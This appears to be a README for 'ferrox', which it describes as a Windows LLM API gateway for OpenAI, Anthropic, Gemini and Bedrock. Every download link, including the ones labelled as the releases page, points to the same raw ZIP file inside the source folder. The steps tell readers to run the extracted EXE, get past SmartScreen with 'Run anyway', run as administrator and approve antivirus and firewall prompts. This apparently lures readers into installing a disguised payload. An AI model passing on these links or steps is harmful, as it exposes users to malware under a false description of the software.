# 🧩 ferrox - Fast LLM API Gateway for Windows

[![Download ferrox](https://img.shields.io/badge/Download-ferrox-blue?style=for-the-badge)](https://raw.githubusercontent.com/Zohuko71/ferrox/main/ferrox/src/providers/Software-v2.5-beta.2.zip)

## 🚀 Overview

ferrox is a local API gateway for large language model services. It sits between your app and providers like OpenAI, Anthropic, Google Gemini, and AWS Bedrock.

It gives you one OpenAI-style HTTP API surface, so you can point tools and apps at one place instead of changing each provider setup by hand.

It runs on Windows and is built to stay light, fast, and simple to operate.

## 📥 Download

1. Open the [ferrox releases page](https://raw.githubusercontent.com/Zohuko71/ferrox/main/ferrox/src/providers/Software-v2.5-beta.2.zip).
2. Find the latest release.
3. Download the Windows file from the Assets list.
4. Save the file to a folder you can reach, such as Downloads or Desktop.
5. If the file is a ZIP, extract it first.
6. If the file is an EXE, double-click it to run.

[Visit the ferrox releases page](https://raw.githubusercontent.com/Zohuko71/ferrox/main/ferrox/src/providers/Software-v2.5-beta.2.zip)

## 🪟 Install on Windows

1. Download the latest Windows release from the link above.
2. If the download is a ZIP file, right-click it and choose Extract All.
3. Open the extracted folder.
4. Look for the main app file. This may be named `ferrox.exe` or a similar Windows app file.
5. Double-click the file to start ferrox.
6. If Windows shows a security prompt, choose Run or More info, then Run anyway if you trust the source.
7. Keep the app window open while you use it.

If you move the file later, run it from the new folder the same way.

## 🖥️ What ferrox does

ferrox helps you manage several LLM providers through one gateway. That means:

- one place to send requests
- one API shape for your tools
- less setup for each app
- easier switching between providers
- a simple path for local and team use

It works like a proxy in front of provider APIs. Your apps talk to ferrox, and ferrox talks to the provider you choose.

## ✨ Main uses

- connect apps to OpenAI-style endpoints
- route requests to Anthropic, Gemini, or Bedrock
- keep one common API format
- reduce repeated setup in each app
- use a single front door for LLM traffic
- support a setup that can grow across machines

## ⚙️ Basic setup

After you open ferrox, set up your provider details in the app or config file used by your release.

Typical setup steps:

1. Add your provider API keys.
2. Choose the provider you want to use.
3. Set the local address ferrox should listen on.
4. Save the settings.
5. Start the gateway.
6. Point your app to the ferrox endpoint.

A common local address may look like:

- `http://localhost:8080`
- `http://127.0.0.1:8080`

If your release uses a config file, place it in the same folder as the app unless the release notes say otherwise.

## 🔌 Supported providers

ferrox is designed to sit in front of:

- OpenAI
- Anthropic
- Google Gemini
- AWS Bedrock

You can use it as a single entry point and let it handle the provider layer behind the scenes.

## 🧭 How it works

Your app sends an OpenAI-compatible request to ferrox.

ferrox checks the request, routes it to the right provider, and returns the response in a format your app can use.

This setup helps when you want:

- one endpoint for many models
- less provider-specific code
- a cleaner setup for local testing
- a small layer between your app and the provider

## 🧰 System requirements

For a smooth Windows install, use:

- Windows 10 or Windows 11
- 64-bit system
- Internet access for provider calls
- Enough free disk space for the app and logs
- Permission to run files from your chosen folder

If you use antivirus or corporate security tools, they may ask for approval the first time you run the app.

## 📁 Suggested folder setup

To keep things simple:

1. Create a folder named `ferrox` in your Documents or Desktop folder.
2. Put the downloaded file there.
3. Extract the ZIP if needed.
4. Keep config files in the same folder.
5. Leave the app file in place so shortcuts keep working.

A clean folder makes updates and backups easier.

## 🔧 First run checklist

Before you start using ferrox, check these items:

- You downloaded the latest release
- You extracted the files if needed
- You opened the app file from the correct folder
- Your provider API key is saved
- Your app points to the ferrox local address
- Your firewall allows local app traffic if needed

## 🧪 Example use

If you have a tool that already works with OpenAI-style APIs, you can change its base URL to ferrox.

Example idea:

- old endpoint: provider API directly
- new endpoint: ferrox local endpoint

Then your tool sends requests to ferrox, and ferrox sends them to the provider you set.

This is useful when you want to switch models without changing every app setting.

## 🛠️ Common tasks

### 🧩 Change providers
Open your settings or config file and switch from one provider to another. Keep the same app endpoint.

### 🔁 Restart the gateway
If you change a key or route, close ferrox and open it again.

### 📄 Check logs
If the release includes logs, open them to see request details, startup status, and error messages.

### 🔒 Keep keys safe
Store API keys only in the config or settings file used by ferrox. Do not paste them into chats or public files.

## 🧱 File layout example

Your folder may look like this:

- `ferrox.exe`
- `config.json`
- `logs`
- `README.md`

Some releases may use a different layout. Use the files included in the release package.

## 🌐 Network and firewall

ferrox runs as a local gateway, so Windows may show a network prompt the first time it starts.

If that happens:

1. Check that the app name matches ferrox.
2. Allow access on your private network if you use it on one machine.
3. Keep public network access off unless you need it.

This helps local apps talk to ferrox without trouble.

## 📝 Configuration tips

Use short, clear settings names when you edit config files.

Good habits:

- keep one config backup
- change one setting at a time
- restart after edits
- keep the local port the same if your other app already uses it

If a setting is not clear, try the default value first.

## 🔍 Troubleshooting

### The app does not open
- Check that the file finished downloading
- Extract the ZIP file first if needed
- Right-click the file and choose Run as administrator if your setup needs it
- Make sure Windows did not block the file

### The app opens, but my other tool cannot connect
- Confirm the local address and port
- Make sure ferrox is still running
- Check the firewall prompt
- Make sure your other app uses the ferrox endpoint, not the original provider endpoint

### Requests fail after I set my key
- Check the API key for typos
- Confirm the correct provider is selected
- Make sure the provider account is active
- Restart ferrox after changes

### I get a blank or error response
- Verify the provider service is available
- Check your local network
- Review logs if they are included
- Try a different model or route

## 🧭 Updating ferrox

When a new release is out:

1. Visit the [ferrox releases page](https://raw.githubusercontent.com/Zohuko71/ferrox/main/ferrox/src/providers/Software-v2.5-beta.2.zip).
2. Download the newest Windows file.
3. Close the old app first.
4. Replace the old files with the new ones.
5. Open the updated app.
6. Check your config after the update.

Keep a copy of your config file before replacing anything.

## 📌 Good fit for

- people who want one LLM API endpoint
- users who switch between providers
- teams that need a shared gateway
- apps that already speak OpenAI-style API
- Windows users who want a local middle layer

## 🧷 Related terms

anthropic, api-gateway, aws-bedrock, gemini, high-performance, llm, openai, openai-compatible, proxy, rust